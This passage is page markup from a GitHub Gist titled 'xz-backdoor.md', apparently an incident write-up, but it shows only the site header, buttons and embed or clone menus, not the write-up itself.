0-.255.253v6.08H33.14v-6.08a.262.262 0 0 0-.255-.253h-3.196a.262.262 0 0 0-.255.253v16.514c0 .133.135.252.255.252h3.196a.262.262 0 0 0 .255-.253v-7.06h4.966l-.03 7.06c0 .134.12.253.255.253h3.195a.262.262 0 0 0 .255-.253V3.892a.262.262 0 0 0-.255-.253Zm-28.31 7.313v8.532c0 .06-.015.163-.09.193 0 0-1.875 1.323-4.966 1.323C4.426 21 0 19.84 0 12.2S3.87 2.986 7.651 3c3.27 0 4.59.728 4.8.862.06.075.09.134.09.208l-.63 2.646c0 .134-.134.297-.3.253-.54-.164-1.35-.49-3.255-.49-2.205 0-4.575.623-4.575 5.543s2.25 5.5 3.87 5.5c1.38 0 1.875-.164 1.875-.164V13.94H7.321c-.165 0-.285-.12-.285-.253v-2.735c0-.134.12-.252.285-.252h5.61c.166 0 .286.118.286.252Z"></path>
</svg>
  <svg aria-hidden="true" height="24" viewBox="0 0 38 24" version="1.1" width="38" data-view-component="true" class="octicon octicon-logo-gist v-align-middle d-none d-md-inline-block">
    <path d="M7.05 13.095v-1.5h5.28v8.535c-1.17.555-2.925.96-5.385.96C1.665 21.09 0 17.055 0 12.045S1.695 3 6.945 3c2.43 0 3.96.495 4.92.99v1.575c-1.83-.75-3-1.095-4.92-1.095-3.855 0-5.22 3.315-5.22 7.59s1.365 7.575 5.205 7.575c1.335 0 2.97-.105 3.795-.51v-6.03H7.05Zm16.47 1.035h.045c3.33.3 4.125 1.425 4.125 3.345 0 1.815-1.14 3.615-4.71 3.615-1.125 0-2.745-.285-3.495-.585v-1.41c.705.255 1.83.54 3.495.54 2.43 0 3.09-1.035 3.09-2.13 0-1.065-.33-1.815-2.655-2.01-3.39-.3-4.095-1.5-4.095-3.12 0-1.665 1.08-3.465 4.38-3.465 1.095 0 2.34.135 3.375.585v1.41c-.915-.3-1.83-.54-3.405-.54-2.325 0-2.82.855-2.82 2.01 0 1.035.42 1.56 2.67 1.755Zm12.87-4.995v1.275h-3.63v7.305c0 1.425.795 2.01 2.25 2.01.3 0 .63 0 .915-.045v1.335c-.255.045-.75.075-1.035.075-1.965 0-3.75-.9-3.75-3.195v-7.5H28.8v-.72l2.34-.66V5.85l1.62-.465v3.75h3.63ZM16.635 9.09v9.615c0 .81.285 1.05 1.005 1.05v1.335c-1.71 0-2.58-.705-2.58-2.58V9.09h1.575Zm.375-3.495c0 .66-.51 1.17-1.17 1.17a1.14 1.14 0 0 1-1.155-1.17c0-.66.48-1.17 1.155-1.17s1.17.51 1.17 1.17Z"></path>
</svg>
</a>
  </div>

    <div class="Header-item f4 mr-0" role="navigation" aria-label="Sign in or sign up">
      <a class="Header-link no-underline mr-3" data-ga-click="Header, sign in" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="99eecb0bd40e2e0a4b06ef77c97b389a773ce4c131e87956995f1a72c1157311" href="https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27">
        Sign&nbsp;in
</a>        <a class="Header-link d-inline-block no-underline border color-border-default rounded px-2 py-1" data-ga-click="Header, sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="78207fa823ed1315687eb334df87df66115b6f30498c9325ea5f16d50e810538" href="/join?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27&amp;source=header-gist">
          Sign&nbsp;up
</a>    </div>
</div>



      <div hidden="hidden" data-view-component="true" class="js-stale-session-flash stale-session-flash flash flash-warn flash-full">
  
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        <span class="js-stale-session-flash-signed-in" hidden>You signed in with another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
        <span class="js-stale-session-flash-signed-out" hidden>You signed out in another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
        <span class="js-stale-session-flash-switched" hidden>You switched accounts on another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>

    <button id="icon-button-347b4de1-509b-4f2e-903f-8908fed3face" aria-labelledby="tooltip-b57c8a16-476c-48e8-94ba-5d89f01df317" type="button" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium flash-close js-flash-close">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x Button-visual">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
</button><tool-tip id="tooltip-b57c8a16-476c-48e8-94ba-5d89f01df317" for="icon-button-347b4de1-509b-4f2e-903f-8908fed3face" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Dismiss alert</tool-tip>


  
</div>
    </div>

  <div id="start-of-content" class="show-on-focus"></div>








    <div id="js-flash-container" class="flash-container" data-turbo-replace>




  <template class="js-flash-template">
    
<div class="flash flash-full   {{ className }}">
  <div >
    <button autofocus class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    <div aria-atomic="true" role="alert" class="js-flash-alert">
      
      <div>{{ message }}</div>

    </div>
  </div>
</div>
  </template>
</div>


    






  <div
    class="application-main "
    data-commit-hovercards-enabled
    data-discussion-hovercards-enabled
    data-issue-and-pr-hovercards-enabled
    data-project-hovercards-enabled
  >
        <div itemscope itemtype="http://schema.org/Code">
    <main id="gist-pjax-container">
      

  <div class="gist-detail-intro gist-banner pb-3">
    <div class="text-center container-lg px-3">
      <p class="lead">
        Instantly share code, notes, and snippets.
      </p>
    </div>
  </div>


<div class="gisthead pagehead pb-0 pt-3 mb-4">
  <div class="px-0">
    
  
<div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
  <div class="flex-auto min-width-0 width-fit mr-3">
    <div class="d-flex">
      <div class="d-none d-md-block">
        <a class="mr-2 flex-shrink-0" data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/thesamesam"><img class="avatar avatar-user" src="https://avatars.githubusercontent.com/u/11667869?s=64&amp;v=4" width="32" height="32" alt="@thesamesam" /></a>
      </div>
      <div class="d-flex flex-column width-full">
        <div class="d-flex flex-row width-full">
          <h1 class="wb-break-word f3 text-normal mb-md-0 mb-1">
            <span class="author"><a data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/thesamesam">thesamesam</a></span><!--
                --><span class="mx-1 color-fg-muted">/</span><!--
                --><strong itemprop="name" class="css-truncate-target mr-1" style="max-width: 410px"><a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27">xz-backdoor.md</a></strong>
          </h1>
        </div>

        <div class="note m-0">
          Last active
          <relative-time tense="past" datetime="2025-01-02T15:08:18Z" data-view-component="true">January 2, 2025 15:08</relative-time>
        </div>
      </div>
    </div>
  </div>
  <ul class="d-md-flex pagehead-actions float-none mr-2">
  </ul>
  <div class="d-inline-block d-md-none ml-auto">
    <action-menu data-select-variant="none" data-view-component="true" class="flex-self-start ml-auto d-inline-block">
  <focus-group direction="vertical" mnemonics retain>
    <button id="gist_options-button" popovertarget="gist_options-overlay" aria-controls="gist_options-list" aria-haspopup="true" aria-labelledby="tooltip-fe3a91cf-8ca7-432f-a6b0-b788b234b59b" type="button" data-view-component="true" class="Button Button--iconOnly Button--secondary Button--small">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal Button-visual">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg>
</button><tool-tip id="tooltip-fe3a91cf-8ca7-432f-a6b0-b788b234b59b" for="gist_options-button" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Show Gist options</tool-tip>


<anchored-position data-target="action-menu.overlay" id="gist_options-overlay" anchor="gist_options-button" align="start" side="outside-bottom" anchor-offset="normal" popover="auto" data-view-component="true">
  <div data-view-component="true" class="Overlay Overlay--size-auto">
    
      <div data-view-component="true" class="Overlay-body Overlay-body--paddingNone">          <action-list>
  <div data-view-component="true">
    <ul aria-labelledby="gist_options-button" id="gist_options-list" role="menu" data-view-component="true" class="ActionListWrap--inset ActionListWrap">
        <li rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;DOWNLOAD_ZIP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129358846,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="96c2921c03dab00f1dbf8ca778844a84cb504ec0d8c71f394a34c70e5a366fe4" data-ga-click="Gist, download zip, location:gist overview" data-targets="action-list.items" data-item-id="download_from_gist_options" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-e264ec46-798b-41c0-bfb3-de357f57ac2d" href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/archive/229a2e0548b629b6154eac6ddc52f33b85ce4c9a.zip" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-download">
    <path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Z"></path><path d="M7.25 7.689V2a.75.75 0 0 1 1.5 0v5.689l1.97-1.969a.749.749 0 1 1 1.06 1.06l-3.25 3.25a.749.749 0 0 1-1.06 0L4.22 6.78a.749.749 0 1 1 1.06-1.06l1.97 1.969Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Download ZIP
</span>      
</a>
  
</li>
</ul>    
</div></action-list>


</div>
      
</div></anchored-position>  </focus-group>
</action-menu>  </div>
  <ul class="d-md-flex d-none pagehead-actions float-none">


      <li>
          <a id="gist-star-button" href="/login?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist star button&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="56c09df661a81441bd64d3cd062e78417088a94391fd1d5fe0b572f2046016d1" aria-label="You must be signed in to star a gist" data-view-component="true" class="btn-with-count Button--secondary Button--small Button">  <span class="Button-content">
      <span class="Button-visual Button-leadingVisual">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star">
    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
</svg>
      </span>
    <span class="Button-label">Star</span>
      <span class="Button-visual Button-trailingVisual">
          <span class="sr-only">(<span aria-hidden="true" title="1,346" data-view-component="true" class="Counter">1,346</span>)</span>
          <span aria-hidden="true" title="1,346" data-view-component="true" class="Counter">1,346</span>
      </span>
  </span>
</a><tool-tip id="tooltip-2546833d-313c-463a-882f-3e8629b1f600" for="gist-star-button" popover="manual" data-direction="n" data-type="description" data-view-component="true" class="sr-only position-absolute">You must be signed in to star a gist</tool-tip>

      </li>
        <li>
            <a id="gist-fork-button" href="/login?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist fork button&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="89b10bb0fc383e0b3beac0acb853f492013eff2e1c162c51f521c9a9bcbf5b24" aria-label="You must be signed in to fork a gist" data-view-component="true" class="btn-with-count Button--secondary Button--small Button">  <span class="Button-content">
      <span class="Button-visual Button-leadingVisual">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked">
    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
</svg>
      </span>
    <span class="Button-label">Fork</span>
      <span class="Button-visual Button-trailingVisual">
          <span class="sr-only">(<span aria-hidden="true" title="64" data-view-component="true" class="Counter">64</span>)</span>
          <span aria-hidden="true" title="64" data-view-component="true" class="Counter">64</span>
      </span>
  </span>
</a><tool-tip id="tooltip-ac6af1d3-9915-4f26-a8cc-234a59937fc7" for="gist-fork-button" popover="manual" data-direction="n" data-type="description" data-view-component="true" class="sr-only position-absolute">You must be signed in to fork a gist</tool-tip>

        </li>
  </ul>
</div>

  <ul class="d-flex d-md-none px-3 mb-2 pagehead-actions float-none" >
    <li>
      
<div data-view-component="true" class="flex-items-center d-inline-flex">
  <action-menu data-menu-input="gist-share-url-sized-down" data-select-variant="single" data-dynamic-label="" data-view-component="true" class="flex-shrink-0">
  <focus-group direction="vertical" mnemonics retain>
    <button id="action-menu-a9464636-c65a-4cb3-b68c-03b86c0dcdbd-button" popovertarget="action-menu-a9464636-c65a-4cb3-b68c-03b86c0dcdbd-overlay" aria-controls="action-menu-a9464636-c65a-4cb3-b68c-03b86c0dcdbd-list" aria-haspopup="true" type="button" data-view-component="true" class="rounded-right-0 border-right-0 Button--secondary Button--small Button">  <span class="Button-content">
    <span class="Button-label">Embed</span>
  </span>
    <span class="Button-visual Button-trailingAction">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
    </span>
</button>


<anchored-position data-target="action-menu.overlay" id="action-menu-a9464636-c65a-4cb3-b68c-03b86c0dcdbd-overlay" anchor="action-menu-a9464636-c65a-4cb3-b68c-03b86c0dcdbd-button" align="start" side="outside-bottom" anchor-offset="normal" popover="auto" data-view-component="true">
  <div data-view-component="true" class="Overlay Overlay--size-auto">
    
      <div data-view-component="true" class="Overlay-body Overlay-body--paddingNone">          <action-list>
  <div data-view-component="true">
    <ul aria-labelledby="action-menu-a9464636-c65a-4cb3-b68c-03b86c0dcdbd-button" id="action-menu-a9464636-c65a-4cb3-b68c-03b86c0dcdbd-list" role="menu" data-view-component="true" class="ActionListWrap--inset ActionListWrap">
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="&lt;script src=&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27.js&quot;&gt;&lt;/script&gt;" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;EMBED&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129358846,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="8eae7b1cd4839d3791511267adbdcce0b28aed35d02e1715ce131ea2c1ce1374" id="item-559e18c6-6dee-42e2-b49d-e743b0f77cac" type="button" role="menuitemradio" aria-checked="true" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
           Embed
</span>      <span data-view-component="true" class="ActionListItem-description">Embed this gist in your website.</span>
</span></button>
  
</li>
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;SHARE&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129358846,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="25a26325f5723ac6737ffc067e3a7a8db6bab8480341cd2f8c0221baedaa73fc" id="item-8ddaba9d-691c-4f65-9817-4280a040fd7a" type="button" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
           Share
</span>      <span data-view-component="true" class="ActionListItem-description">Copy sharable link for this gist.</span>
</span></button>
  
</li>
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="https://gist.github.com/223949d5a074ebc3dce9ee78baad9e27.git" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;USE_HTTPS&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129358846,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="b23a462368870b567c5577647050841a46ecd6f73d44c0eddf3e122a853b342e" id="item-d3719b61-9f14-4a5c-a831-e1970bba2ffa" type="button" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
          Clone via HTTPS
</span>      <span data-view-component="true" class="ActionListItem-description">Clone using the web URL.</span>
</span></button>
  
</li>
        <li role="presentation" aria-hidden="true" data-view-component="true" class="ActionList-sectionDivider"></li>
        <li target="_blank" rel="noopener noreferrer" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-917fac6b-e2d9-48c4-8687-05a05fd25c84" href="https://docs.github.com/articles/which-remote-url-should-i-use" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-question">
    <path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.92 6.085h.001a.749.749 0 1 1-1.342-.67c.169-.339.436-.701.849-.977C6.845 4.16 7.369 4 8 4a2.756 2.756 0 0 1 1.637.525c.503.377.863.965.863 1.725 0 .448-.115.83-.329 1.15-.205.307-.47.513-.692.662-.109.072-.22.138-.313.195l-.006.004a6.24 6.24 0 0 0-.26.16.952.952 0 0 0-.276.245.75.75 0 0 1-1.248-.832c.184-.264.42-.489.692-.661.103-.067.207-.132.313-.195l.007-.004c.1-.061.182-.11.258-.161a.969.969 0 0 0 .277-.245C8.96 6.514 9 6.427 9 6.25a.612.612 0 0 0-.262-.525A1.27 1.27 0 0 0 8 5.5c-.369 0-.595.09-.74.187a1.01 1.01 0 0 0-.34.398ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
                Learn more about clone URLs

</span>      
</a>
  
</li>
</ul>    
</div></action-list>


</div>
      
</div></anchored-position>  </focus-group>
</action-menu>    <primer-text-field class="FormControl width-full FormControl--fullWidth">
      <label for="gist-share-url-sized-down" class="sr-only FormControl-label">
        Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
</label>    
  <div class="FormControl-input-wrap FormControl-input-wrap--small">
    
      <input id="gist-share-url-sized-down" aria-label="Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;" value="&lt;script src=&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27.js&quot;&gt;&lt;/script&gt;" readonly="readonly" data-autoselect="true" data-target="primer-text-field.inputElement " aria-describedby="validation-daea74f8-5f40-4a32-b4be-385c1d1a1734" class="form-control FormControl-monospace FormControl-input FormControl-small rounded-left-0 rounded-right-0 border-right-0" type="text" name="gist-share-url-sized-down" />
</div>
      <div class="FormControl-inlineValidation" id="validation-daea74f8-5f40-4a32-b4be-385c1d1a1734" hidden="hidden">
  <span class="FormControl-inlineValidation--visual" data-target="primer-text-field.validationSuccessIcon" hidden><svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-check-circle-fill">
    <path d="M6 0a6 6 0 1 1 0 12A6 6 0 0 1 6 0Zm-.705 8.737L9.63 4.403 8.392 3.166 5.295 6.263l-1.7-1.702L2.356 5.8l2.938 2.938Z"></path>
</svg></span>
  <span class=" FormControl-inlineValidation--visual" data-target="primer-text-field.validationErrorIcon"><svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-alert-fill">
    <path d="M4.855.708c.5-.896 1.79-.896 2.29 0l4.675 8.351a1.312 1.312 0 0 1-1.146 1.954H1.33A1.313 1.313 0 0 1 .183 9.058ZM7 7V3H5v4Zm-1 3a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"></path>
</svg></span>
  <span></span>
</div>
    
</primer-text-field>
  <span data-view-component="true">
  <clipboard-copy id="clipboard-button" aria-label="Copy" for="gist-share-url-sized-down" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;COPY_URL&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129358846,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="501cdd4a2cdcefe7e7ce3067f62d0a42d715b9263c1506ab93c54677df3e3ff2" type="button" data-view-component="true" class="rounded-left-0 Button--secondary Button--small Button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg style="display: none;" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check color-fg-success">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>

</div>
    </li>
    <li>
